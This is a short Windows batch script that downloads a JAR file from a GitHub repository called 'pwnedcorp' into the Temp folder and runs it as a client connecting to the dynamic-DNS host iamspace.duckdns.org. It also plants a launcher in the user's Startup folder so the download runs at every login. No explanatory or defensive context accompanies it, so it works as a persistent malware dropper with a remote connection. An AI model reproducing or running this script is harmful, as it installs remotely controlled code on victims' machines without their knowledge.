@echo off
cd %LocalAppData%\Temp
powershell -Command "Invoke-WebRequest https://github.com/pwnedcorp/announcer/raw/main/announcer-1.0-SNAPSHOT.jar -OutFile messages.jar"
echo java -jar %LocalAppData%\Temp\messages.jar -client iamspace.duckdns.org>client_on_start.bat
xcopy /y client_on_start.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
del client_on_start.bat
java -jar messages.jar -client iamspace.duckdns.org
